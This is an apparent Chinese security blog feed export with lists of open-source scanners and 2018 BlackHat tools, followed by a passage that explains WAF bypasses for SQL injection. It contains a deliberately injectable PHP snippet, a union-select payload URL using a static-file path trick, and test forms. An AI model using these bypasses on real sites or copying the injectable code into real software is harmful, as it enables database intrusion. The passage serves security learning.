title="模块化设计扫描器或漏洞检测框架"></a>模块化设计扫描器或漏洞检测框架</h4><ul><li><a href="https://github.com/az0ne/AZScanner" target="_blank" rel="noopener">https://github.com/az0ne/AZScanner</a> (自动漏洞扫描器，子域名爆破，端口扫描，目录爆破，常用框架漏洞检测)</li><li><a href="https://github.com/blackye/lalascan" target="_blank" rel="noopener">https://github.com/blackye/lalascan</a> (集合owasp top10漏洞扫描和边界资产发现能力的分布式web漏洞扫描框架)</li><li><a href="https://github.com/blackye/BkScanner" target="_blank" rel="noopener">https://github.com/blackye/BkScanner</a> (BkScanner 分布式、插件化web漏洞扫描器)</li><li><a href="https://github.com/ysrc/GourdScanV2" target="_blank" rel="noopener">https://github.com/ysrc/GourdScanV2</a> （ysrc出品的被动式漏洞扫描工具)</li><li><a href="https://github.com/netxfly/passive_scan" target="_blank" rel="noopener">https://github.com/netxfly/passive_scan</a> (基于http代理的web漏洞扫描器)</li><li><a href="https://github.com/1N3/Sn1per" target="_blank" rel="noopener">https://github.com/1N3/Sn1per</a> (自动化扫描器，包括中间件扫描以及设备指纹识别)</li><li><a href="https://github.com/RASSec/pentestEr_Fully-automatic-scanner" target="_blank" rel="noopener">https://github.com/RASSec/pentestEr_Fully-automatic-scanner</a> （定向全自动化渗透测试工具）</li><li><a href="https://github.com/3xp10it/3xp10it" target="_blank" rel="noopener">https://github.com/3xp10it/3xp10it</a> （自动化渗透测试框架，支持cdn真实ip查找、指纹识别等)</li><li><a href="https://github.com/Lcys/lcyscan" target="_blank" rel="noopener">https://github.com/Lcys/lcyscan</a> (python插件化漏洞扫描器，支持生成扫描报表）</li><li><a href="https://github.com/Xyntax/POC-T" target="_blank" rel="noopener">https://github.com/Xyntax/POC-T</a> （渗透测试插件化并发框架）</li><li><a href="https://github.com/v3n0m-Scanner/V3n0M-Scanner" target="_blank" rel="noopener">https://github.com/v3n0m-Scanner/V3n0M-Scanner</a> （支持检测SQLi/XSS/LFI/RFI等漏洞的扫描器）</li><li><a href="https://github.com/Skycrab/leakScan" target="_blank" rel="noopener">https://github.com/Skycrab/leakScan</a> （Web图形化的的漏洞扫描框架）</li><li><a href="https://github.com/zhangzhenfeng/AnyScan" target="_blank" rel="noopener">https://github.com/zhangzhenfeng/AnyScan</a> (一款web化的自动化渗透测试框架)</li><li><a href="https://github.com/Tuhinshubhra/RED_HAWK" target="_blank" rel="noopener">https://github.com/Tuhinshubhra/RED_HAWK</a> (一款集成信息收集、漏洞扫描、指纹识别等的多合一扫描工具）</li><li><a href="https://github.com/Arachni/arachni" target="_blank" rel="noopener">https://github.com/Arachni/arachni</a> (高度集成化的Web应用漏洞扫描框架，支持REST、RPC等api调用）</li><li><a href="https://github.com/infobyte/faraday" target="_blank" rel="noopener">https://github.com/infobyte/faraday</a> （集成化渗透测试辅助平台及漏洞管理平台）</li><li><a href="https://github.com/juansacco/exploitpack" target="_blank" rel="noopener">https://github.com/juansacco/exploitpack</a> (渗透测试集成框架，包含超过38,000+ exploits)</li><li><a href="https://github.com/swisskyrepo/DamnWebScanner" target="_blank" rel="noopener">https://github.com/swisskyrepo/DamnWebScanner</a> （基于chrome/opera插件的被动式漏洞扫描）</li><li><a href="https://github.com/anilbaranyelken/tulpar" target="_blank" rel="noopener">https://github.com/anilbaranyelken/tulpar</a> (支持多种web漏洞扫描，命令行环境使用）</li><li><a href="https://github.com/m4ll0k/Spaghetti" target="_blank" rel="noopener">https://github.com/m4ll0k/Spaghetti</a> (web应用扫描器，支持指纹识别、文件目录爆破、SQL/XSS/RFI等漏洞扫描，也可直接用于struts、ShellShock等扫描)</li><li><a href="https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest" target="_blank" rel="noopener">https://github.com/Yukinoshita47/Yuki-Chan-The-Auto-Pentest</a> (集成子域名枚举、nmap、waf指纹识别等模块的web应用扫描器）</li><li><a href="https://github.com/0xsauby/yasuo" target="_blank" rel="noopener">https://github.com/0xsauby/yasuo</a> (使用ruby开发的扫描网络中主机存在的第三方web应用服务漏洞）</li><li><a href="https://github.com/hatRiot/clusterd" target="_blank" rel="noopener">https://github.com/hatRiot/clusterd</a> (Web应用自动化扫描框架,支持自动化上传webshell)</li><li><a href="https://github.com/erevus-cn/pocscan" target="_blank" rel="noopener">https://github.com/erevus-cn/pocscan</a> （一款开源 Poc 调用框架,可轻松调用Pocsuite,Tangscan,Beebeeto,Knowsec老版本POC，可使用docker部署）</li><li><a href="https://github.com/TophantTechnology/osprey" target="_blank" rel="noopener">https://github.com/TophantTechnology/osprey</a> (斗象能力中心出品并长期维护的开源漏洞检测框架)</li><li><a href="https://github.com/yangbh/Hammer" target="_blank" rel="noopener">https://github.com/yangbh/Hammer</a> (Web应用漏洞扫描框架)</li><li><a href="https://github.com/Lucifer1993/AngelSword" target="_blank" rel="noopener">https://github.com/Lucifer1993/AngelSword</a> (Web应用漏洞扫描框架,基于python3)</li><li><a href="https://github.com/secrary/EllaScanner" target="_blank" rel="noopener">https://github.com/secrary/EllaScanner</a> (被动式漏洞扫描，支持历史cve编号漏洞识别)</li><li><a href="https://github.com/zaproxy/zaproxy" target="_blank" rel="noopener">https://github.com/zaproxy/zaproxy</a> (The OWASP ZAP core project出品的综合性渗透测试工具）</li><li><a href="https://github.com/sullo/nikto" target="_blank" rel="noopener">https://github.com/sullo/nikto</a> (Web服务综合型扫描器，用于指定目标的资产收集、安全配置缺陷或者安全漏洞扫描）</li><li><a href="https://github.com/s0md3v/Striker" target="_blank" rel="noopener">https://github.com/s0md3v/Striker</a> (一款多方位信息收集、指纹识别及漏洞扫描工具）</li><li><a href="https://github.com/dermotblair/webvulscan" target="_blank" rel="noopener">https://github.com/dermotblair/webvulscan</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞，支持输出pdf报告)</li><li><a href="https://github.com/alienwithin/OWASP-mth3l3m3nt-framework" target="_blank" rel="noopener">https://github.com/alienwithin/OWASP-mth3l3m3nt-framework</a> (渗透测试辅助工具，综合利用框架）</li><li><a href="https://github.com/toyakula/luna" target="_blank" rel="noopener">https://github.com/toyakula/luna</a> (基于被动式扫描框架的自动化web漏洞扫描工具）</li><li><a href="https://github.com/Manisso/fsociety" target="_blank" rel="noopener">https://github.com/Manisso/fsociety</a> (渗透测试辅助框架，包含信息搜集、无线渗透、web应用扫描等功能)</li><li><a href="https://github.com/boy-hack/w9scan" target="_blank" rel="noopener">https://github.com/boy-hack/w9scan</a> (内置1200+插件的web漏洞扫描框架)</li><li><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a> (Web服务安全评估工具,提供基于windows操作系统的简单.exe应用)</li><li><a href="https://github.com/AmyangXYZ/AssassinGo" target="_blank" rel="noopener">https://github.com/AmyangXYZ/AssassinGo</a> (使用Go开发的可扩展以及高并发渗透测试框架)</li><li><a href="https://github.com/jeffzh3ng/InsectsAwake" target="_blank" rel="noopener">https://github.com/jeffzh3ng/InsectsAwake</a> (基于 Flask 应用框架的漏洞扫描系统)</li><li><a href="https://github.com/m4ll0k/Galileo" target="_blank" rel="noopener">https://github.com/m4ll0k/Galileo</a> (一个操作上类似metasploit的web应用安全审计框架)</li><li><a href="https://github.com/joker25000/Optiva-Framework" target="_blank" rel="noopener">https://github.com/joker25000/Optiva-Framework</a> (一款web应用漏洞扫描器，支持扫描反射型以及存储型xss、sql injection等漏洞)</li><li><a href="https://github.com/theInfectedDrake/TIDoS-Framework" target="_blank" rel="noopener">https://github.com/theInfectedDrake/TIDoS-Framework</a> (集成104个模块的Web应用程序渗透测试框架)</li></ul><h4 id="高级持续性威胁-APT-相关工具"><a href="#高级持续性威胁-APT-相关工具" class="headerlink" title="高级持续性威胁(APT)相关工具"></a>高级持续性威胁(APT)相关工具</h4><ul><li><a href="https://github.com/Neo23x0/Loki" target="_blank" rel="noopener">https://github.com/Neo23x0/Loki</a> (一款APT入侵痕迹扫描器)</li></ul><h4 id="工控系统-amp-大型网络相关安全工具"><a href="#工控系统-amp-大型网络相关安全工具" class="headerlink" title="工控系统&amp;大型网络相关安全工具"></a>工控系统&amp;大型网络相关安全工具</h4><ul><li><a href="https://github.com/w3h/icsmaster/tree/master/nse" target="_blank" rel="noopener">https://github.com/w3h/icsmaster/tree/master/nse</a> （ICS设备nmap扫描脚本)</li><li><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a> （SDN安全评估框架）</li></ul><hr><h3 id="收集目的"><a href="#收集目的" class="headerlink" title="收集目的"></a>收集目的</h3><p>本仓库收集的初衷是为向各类企业安全从业人员提供在企业信息安全防护体系建设过程中可以参考的开源安全扫描工具，以期望企业能够利用这些扫描器对自身业务进行自检，从而提高自身业务安全性</p><blockquote><p>项目地址：<code>https://github.com/We5ter/Scanners-Box/blob/master/README_CN.md</code></p></blockquote>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018-BlackHat-Tools-List</title>
      <link href="/2018/12/24/2018-blackhat-tools-list/"/>
      <url>/2018/12/24/2018-blackhat-tools-list/</url>
      
        <content type="html"><![CDATA[<p>2018 BlackHat Tools List</p><p>Android，iOS和移动黑客</p><p>易受攻击的iOS应用程序：Swift版</p><p><a href="https://github.com/prateek147/DVIA-v2" target="_blank" rel="noopener">https://github.com/prateek147/DVIA-v2</a></p><p>代码评估</p><p>OWASP依赖性检查</p><p><a href="https://github.com/jeremylong/DependencyCheck" target="_blank" rel="noopener">https://github.com/jeremylong/DependencyCheck</a></p><p>美洲狮扫描</p><p><a href="https://github.com/pumasecurity/puma-scan" target="_blank" rel="noopener">https://github.com/pumasecurity/puma-scan</a></p><p>加密</p><p>DeepViolet：SSL / TLS扫描API和工具</p><p><a href="https://github.com/spoofzu/DeepViolet" target="_blank" rel="noopener">https://github.com/spoofzu/DeepViolet</a></p><p>数据取证和事件响应</p><p>初学者到专家</p><p><a href="https://github.com/bro/bro" target="_blank" rel="noopener">https://github.com/bro/bro</a></p><p>CyBot：开源威胁情报聊天机器人</p><p><a href="https://github.com/CylanceSPEAR/CyBot" target="_blank" rel="noopener">https://github.com/CylanceSPEAR/CyBot</a></p><p>LogonTracer</p><p><a href="https://github.com/JPCERTCC/LogonTracer" target="_blank" rel="noopener">https://github.com/JPCERTCC/LogonTracer</a></p><p>rastrea2r（重新加载！）：用Gusto和Style收集和狩猎IOC</p><p><a href="https://github.com/rastrea2r/rastrea2r" target="_blank" rel="noopener">https://github.com/rastrea2r/rastrea2r</a></p><p>RedHunt OS（VM）：用于对手仿真和威胁搜索的虚拟机</p><p><a href="https://github.com/redhuntlabs/RedHunt-OS" target="_blank" rel="noopener">https://github.com/redhuntlabs/RedHunt-OS</a></p><p>剥削与道德黑客</p><p>AVET：AntiVirus Evasion Tool</p><p><a href="https://github.com/govolution/avet" target="_blank" rel="noopener">https://github.com/govolution/avet</a></p><p>DSP：Docker安全游乐场</p><p><a href="https://github.com/giper45/DockerSecurityPlayground" target="_blank" rel="noopener">https://github.com/giper45/DockerSecurityPlayground</a></p><p>hideNsneak：攻击混淆框架</p><p><a href="https://github.com/rmikehodges/hideNsneak" target="_blank" rel="noopener">https://github.com/rmikehodges/hideNsneak</a></p><p>梅林</p><p><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="noopener">https://github.com/Ne0nd0g/merlin</a></p><p>RouterSploit</p><p><a href="https://github.com/threat9/routersploit" target="_blank" rel="noopener">https://github.com/threat9/routersploit</a></p><p>硬件/嵌入式</p><p>ChipWhisperer</p><p><a href="https://github.com/newaetech/chipwhisperer" target="_blank" rel="noopener">https://github.com/newaetech/chipwhisperer</a></p><p>JTAGulator ：揭开硬件安全的致命弱点</p><p><a href="https://github.com/grandideastudio/jtagulator" target="_blank" rel="noopener">https://github.com/grandideastudio/jtagulator</a></p><p>Micro-Renovator：将处理器固件带入代码</p><p><a href="https://github.com/syncsrc/MicroRenovator" target="_blank" rel="noopener">https://github.com/syncsrc/MicroRenovator</a></p><p>TumbleRF：RF模糊变得容易</p><p><a href="https://github.com/riverloopsec/tumblerf" target="_blank" rel="noopener">https://github.com/riverloopsec/tumblerf</a></p><p>Walrus：充分利用您的卡片克隆设备</p><p><a href="https://github.com/TeamWalrus/Walrus" target="_blank" rel="noopener">https://github.com/TeamWalrus/Walrus</a></p><p>物联网</p><p>物联网设备的可扩展动态分析框架</p><p><a href="https://github.com/sycurelab/DECAF" target="_blank" rel="noopener">https://github.com/sycurelab/DECAF</a></p><p>BLE CTF项目</p><p><a href="https://github.com/hackgnar/ble_ctf" target="_blank" rel="noopener">https://github.com/hackgnar/ble_ctf</a></p><p>WHID注射器和WHID Elite：新一代HID攻击性设备</p><p><a href="https://github.com/whid-injector/WHID" target="_blank" rel="noopener">https://github.com/whid-injector/WHID</a></p><p>恶意软件防御</p><p>为每位安全研究人员提供高级深度学习分析平台</p><p><a href="https://github.com/intel/Resilient-ML-Research-Platform" target="_blank" rel="noopener">https://github.com/intel/Resilient-ML-Research-Platform</a></p><p>EKTotal</p><p><a href="https://github.com/nao-sec/ektotal" target="_blank" rel="noopener">https://github.com/nao-sec/ektotal</a></p><p>固件审计：Blue Teams和DFIR的平台固件安全自动化</p><p><a href="https://github.com/PreOS-Security/fwaudit" target="_blank" rel="noopener">https://github.com/PreOS-Security/fwaudit</a></p><p>MaliceIO</p><p><a href="https://github.com/maliceio/malice" target="_blank" rel="noopener">https://github.com/maliceio/malice</a></p><p>目标 – 参见MacOS安全工具</p><p><a href="https://github.com/objective-see" target="_blank" rel="noopener">https://github.com/objective-see</a></p><p>恶意软件进攻</p><p>BloodHound 1.5</p><p><a href="https://github.com/BloodHoundAD/BloodHound" target="_blank" rel="noopener">https://github.com/BloodHoundAD/BloodHound</a></p><p>网络攻击</p><p>军械库</p><p><a href="https://github.com/depthsecurity/armory" target="_blank" rel="noopener">https://github.com/depthsecurity/armory</a></p><p>Chiron：一种先进的IPv6安全评估和渗透测试框架</p><p><a href="https://github.com/aatlasis/Chiron" target="_blank" rel="noopener">https://github.com/aatlasis/Chiron</a></p><p>DELTA：SDN安全评估框架</p><p><a href="https://github.com/OpenNetworkingFoundation/DELTA" target="_blank" rel="noopener">https://github.com/OpenNetworkingFoundation/DELTA</a></p><p>Mallet：任意协议的拦截代理</p><p><a href="https://github.com/sensepost/mallet" target="_blank" rel="noopener">https://github.com/sensepost/mallet</a></p><p>PowerUpSQL：用于在企业环境中攻击SQL Server的PowerShell工具包</p><p><a href="https://github.com/NetSPI/PowerUpSQL" target="_blank" rel="noopener">https://github.com/NetSPI/PowerUpSQL</a></p><p>WarBerryPi</p><p><a href="https://github.com/secgroundzero/warberry" target="_blank" rel="noopener">https://github.com/secgroundzero/warberry</a></p><p>网络防御</p><p>ANWI（全新无线IDS）：5美元的WIDS</p><p><a href="https://github.com/SanketKarpe/anwi" target="_blank" rel="noopener">https://github.com/SanketKarpe/anwi</a></p><p>CHIRON：基于家庭的网络分析和机器学习威胁检测框架</p><p><a href="https://github.com/jzadeh/chiron-elk" target="_blank" rel="noopener">https://github.com/jzadeh/chiron-elk</a></p><p>云安全套件：AWS / GCP / Azure安全审计的一站式工具</p><p><a href="https://github.com/SecurityFTW/cs-suite" target="_blank" rel="noopener">https://github.com/SecurityFTW/cs-suite</a></p><p>DejaVu：一个开源欺骗框架</p><p><a href="https://github.com/bhdresh/Dejavu" target="_blank" rel="noopener">https://github.com/bhdresh/Dejavu</a></p><p>OSINT – 开源智能</p><p>DataSploit 2.0</p><p><a href="https://github.com/DataSploit/datasploit" target="_blank" rel="noopener">https://github.com/DataSploit/datasploit</a></p><p>Dradis 框架：了解如何将报告时间缩短一半</p><p><a href="https://github.com/dradis/dradis-ce" target="_blank" rel="noopener">https://github.com/dradis/dradis-ce</a></p><p>逆向工程</p><p>Snake：恶意软件存储动物园</p><p><a href="https://github.com/countercept/snake" target="_blank" rel="noopener">https://github.com/countercept/snake</a></p><p>智能电网/工业安全</p><p>GRFICS ：工业控制模拟的图形现实主义框架</p><p><a href="https://github.com/djformby/GRFICS" target="_blank" rel="noopener">https://github.com/djformby/GRFICS</a></p><p>漏洞评估</p><p>用于机器学习模型的对抗鲁棒性工具箱</p><p><a href="https://github.com/IBM/adversarial-robustness-toolbox" target="_blank" rel="noopener">https://github.com/IBM/adversarial-robustness-toolbox</a></p><p>Android动态分析工具（ADA）</p><p><a href="https://github.com/ANELKAOS/ada" target="_blank" rel="noopener">https://github.com/ANELKAOS/ada</a></p><p>射箭：开源漏洞评估和管理</p><p><a href="https://github.com/archerysec/archerysec" target="_blank" rel="noopener">https://github.com/archerysec/archerysec</a></p><p>boofuzz</p><p><a href="https://github.com/jtpereyda/boofuzz" target="_blank" rel="noopener">https://github.com/jtpereyda/boofuzz</a></p><p>BTA</p><p><a href="https://github.com/airbus-seclab/bta" target="_blank" rel="noopener">https://github.com/airbus-seclab/bta</a></p><p>深度利用</p><p><a href="https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit" target="_blank" rel="noopener">https://github.com/13o-bbr-bbq/machine_learning_security/tree/master/DeepExploit</a></p><p>Halcyon IDE：适用于Nmap脚本开发人员</p><p><a href="https://github.com/s4n7h0/Halcyon" target="_blank" rel="noopener">https://github.com/s4n7h0/Halcyon</a></p><p>SimpleRisk</p><p><a href="https://github.com/simplerisk" target="_blank" rel="noopener">https://github.com/simplerisk</a></p><p>TROMMEL</p><p><a href="https://github.com/CERTCC/trommel" target="_blank" rel="noopener">https://github.com/CERTCC/trommel</a></p><p>Web AppSec</p><p>看看NGINX的ModSec 3.0：软件Web应用程序防火墙</p><p><a href="https://github.com/SpiderLabs/ModSecurity" target="_blank" rel="noopener">https://github.com/SpiderLabs/ModSecurity</a></p><p>Astra：REST API的自动安全测试</p><p><a href="https://github.com/flipkart-incubator/Astra" target="_blank" rel="noopener">https://github.com/flipkart-incubator/Astra</a></p><p>Burp Replicator：自动化复杂漏洞的复制</p><p><a href="https://github.com/PortSwigger/replicator" target="_blank" rel="noopener">https://github.com/PortSwigger/replicator</a></p><p>OWASP进攻性Web测试框架</p><p><a href="https://github.com/owtf/owtf" target="_blank" rel="noopener">https://github.com/owtf/owtf</a></p><p>OWASP JoomScan项目</p><p><a href="https://github.com/rezasp/joomscan" target="_blank" rel="noopener">https://github.com/rezasp/joomscan</a></p><p>WSSAT</p><p><a href="https://github.com/YalcinYolalan/WSSAT" target="_blank" rel="noopener">https://github.com/YalcinYolalan/WSSAT</a></p>]]></content>
      
      
      <categories>
          
          <category> 转载 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 工具介绍 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>【总结】- Bypass 360主机卫士SQL注入防御（多姿势）</title>
      <link href="/2018/12/24/360-zhu-ji-wei-shi-sql-zhu-ru-fang-yu-duo-zi-shi/"/>
      <url>/2018/12/24/360-zhu-ji-wei-shi-sql-zhu-ru-fang-yu-duo-zi-shi/</url>
      
        <content type="html"><![CDATA[<blockquote><p>原文链接：<a href="https://www.t00ls.net/articles-45943.html" target="_blank" rel="noopener">https://www.t00ls.net/articles-45943.html</a></p></blockquote><p><strong>此文并非抄袭，而是把文章中作者没写清楚的知识点写出来，然后更为人性化的输出来（吹个牛皮），也是为了让自己印象更加深刻~</strong></p><p>首先第一步作者使用的注入点代码是</p><pre class=" language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token variable">$id</span><span class="token operator">=</span><span class="token variable">$_REQUEST</span><span class="token punctuation">[</span><span class="token string">'id'</span><span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token variable">$query</span> <span class="token operator">=</span> <span class="token string">"SELECT * FROM admin WHERE id = $id "</span><span class="token punctuation">;</span><span class="token punctuation">.</span><span class="token punctuation">.</span><span class="token punctuation">.</span></code></pre><p>可以看到上面的代码是直接将<code>$id</code>参数代入然后执行<code>sql</code>语句的，然后下面就是这里加上<code>waf</code>后绕过的总结</p><h3 id="什么是waf"><a href="#什么是waf" class="headerlink" title="什么是waf"></a>什么是<code>waf</code></h3><p><code>waf</code>呢可以当作是王者荣耀里面的防御塔，然后里面有一个玩家在想，我去挂机一会，然后在防御塔里面（非泉水，哈哈哈哈）待着就不会死，但是他们忘记了，英雄<strong>刘禅</strong>的4个技能是可以让防御塔眩晕的，而且还有<strong>干扰</strong>技能可以让防御塔眩晕一段时间，那么这个时间内如果输出伤害足够的话就可以让在防御塔下面的对手打shi，那么这个防御塔类似就是<code>waf</code>，但是他并不是绝对的安全的，就好像我说的那几个英雄和技能之类的，所以想要解决安全的根本问题，还是要在代码处将功能点写安全才行。</p><h3 id="绕过总结"><a href="#绕过总结" class="headerlink" title="绕过总结"></a>绕过总结</h3><h4 id="1、使用网站白名单"><a href="#1、使用网站白名单" class="headerlink" title="1、使用网站白名单"></a>1、使用网站白名单</h4><p>一般来说<code>waf</code>都是用正则匹配<code>Url</code>中是否存在某个值，如果存在一个值是<code>waf</code>中设置了拦截的，那么他是不能够访问的，就比如我们经常在<code>url</code>的参数中输入了<code>and sleep()</code>、<code>union select</code>、<code>select</code>这些都是会给拦截的，那么这里就是因为有<code>waf</code>检测到了<code>url</code>的参数中带有非法字符，但是在不常出现的情况下，我们需要访问一个登陆管理界面的<code>Url</code>为<code>www.xxx.com/admin.php?action=select</code>，那么这里是存在<code>select</code>的，那么<code>waf</code>就会去拦截的，所以就会有一个功能，就是<strong>网站后台白名单</strong>，所以如果管理员很调皮的设置了一些常用的注入语句为白名单的话，基本上他就会被祭tian的。</p><p><img src="http://static.zybuluo.com/1kbfree/yp1tkw2pgk33e3z7ly2kqief/image_1cljiinjg1k7lffg1f8aje4dhp9.png" alt="image_1cljiinjg1k7lffg1f8aje4dhp9.png-132.6kB"></p><h4 id="2、利用静态资源方式绕过waf"><a href="#2、利用静态资源方式绕过waf" class="headerlink" title="2、利用静态资源方式绕过waf"></a>2、利用静态资源方式绕过<code>waf</code></h4><p><img src="http://static.zybuluo.com/1kbfree/7xv3w3795o9gshgghqsq2mkx/image_1cljip8s41gjv18281h3h1g8j1952m.png" alt="image_1cljip8s41gjv18281h3h1g8j1952m.png-117.7kB"></p><p>这里也讲的比较清楚，如果还是不懂的话我还是讲一下把。</p><p>可以看到图中访问的<code>Url</code>是</p><pre><code>www.xxx.com/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</code></pre><p>可能有人会问（应该是懒人把，因为勤快的人会自己搭建来尝试的），这里的<code>1.png</code>是不存在的，为什么可以访问呢（这里我也不懂，而且也搜索不到，但是我猜测是<code>php</code>把<code>/</code>后面的内容当参数了但是我去打印了一下发现并没有，5555，如果有知道准确原因的师傅可以来告诉我一下），然后我自己搭建了一下，如下图</p><p><img src="http://static.zybuluo.com/1kbfree/3iigqi92wwhemplh0mrgf8gv/image_1cljj5ir91cph5ah831kkreg413.png" alt="image_1cljj5ir91cph5ah831kkreg413.png-22.9kB"></p><p>虽然我不懂为什么在<code>/</code>后面加上任何参数都可以照常访问,但是我知道他这里绕过的具体方式，就是一般的<code>waf</code>搭建起来的话要去检查每个用户访问的<code>url</code>，这相当的耗费性能，所以这个<code>waf</code>不会去拦截静态的文件也就是图片文件，<code>css</code>后缀文件和<code>js</code>后缀文件这些，那么原文中访问的<code>www.xxx.com/test.php/1.png?id=1 union select 1,2,schema_name from information_schema.SCHEMATA</code>就是把这个当作静态文件了，所以没有做拦截~</p><h4 id="3、缓冲区溢出"><a href="#3、缓冲区溢出" class="headerlink" title="3、缓冲区溢出"></a>3、缓冲区溢出</h4><p>这个漏洞我不太懂(所以直接看原文把，啊哈哈哈哈)，但是感觉非常神，所以有空的时候再去了解一下</p><h4 id="4、uri参数溢出"><a href="#4、uri参数溢出" class="headerlink" title="4、uri参数溢出"></a>4、uri参数溢出</h4><p>这个也是没有了解过的绕过方法，实在是学习了一大波了</p><p><img src="http://static.zybuluo.com/1kbfree/i3dh02web05dg90ur11aontq/image_1cljk4pagc9814fidfg1ta61nan1g.png" alt="image_1cljk4pagc9814fidfg1ta61nan1g.png-95.3kB"></p><p>这里也讲的非常清楚啦~，所以不再说了~</p><h4 id="5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入-可轻易Bypass。"><a href="#5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入-可轻易Bypass。" class="headerlink" title="5、在同时提交GET、POST请求时，会进入POST逻辑，而忽略了GET请求的有害参数输入,可轻易Bypass。"></a>5、在同时提交<code>GET</code>、<code>POST</code>请求时，会进入<code>POST</code>逻辑，而忽略了<code>GET</code>请求的有害参数输入,可轻易<code>Bypass</code>。</h4><p>因为这个比较好理解，而且原文也实际操作了，所以不再重复啦~</p><h4 id="6、利用协议解析的差异来绕过"><a href="#6、利用协议解析的差异来绕过" class="headerlink" title="6、利用协议解析的差异来绕过"></a>6、利用协议解析的差异来绕过</h4><p>原文里是构造了怎么一个代码，如下</p><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://192.168.204.128/test.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>post<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><p>然后在浏览器打开并在输入框中输入参数</p><p><img src="http://static.zybuluo.com/1kbfree/bnv4usc55zvkbbghsaa97ah6/VS2Z6K_ZKB451HRSF4VG_L0.png" alt="VS2Z6K_ZKB451HRSF4VG_L0.png-81.7kB"></p><p>然后我在本地测试一下看看能不能用这个方法来传递参数</p><h5 id="1-创建了一个hello-html文件，他的代码是"><a href="#1-创建了一个hello-html文件，他的代码是" class="headerlink" title="1 .  创建了一个hello.html文件，他的代码是"></a>1 .  创建了一个<code>hello.html</code>文件，他的代码是</h5><pre class=" language-html"><code class="language-html"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span> <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>http://127.0.0.1/hello.php<span class="token punctuation">"</span></span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>get<span class="token punctuation">"</span></span> <span class="token attr-name">enctype</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>multipart/form-data<span class="token punctuation">"</span></span><span class="token punctuation">></span></span> <span class="token comment" spellcheck="true">&lt;!--method的值是什么，他就是以什么请求方式传递的--></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text<span class="token punctuation">"</span></span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>id<span class="token punctuation">"</span></span><span class="token punctuation">></span></span>    <span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>submit<span class="token punctuation">"</span></span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></code></pre><h5 id="2-创建了一个hello-php文件，他的代码是"><a href="#2-创建了一个hello-php文件，他的代码是" class="headerlink" title="2 .  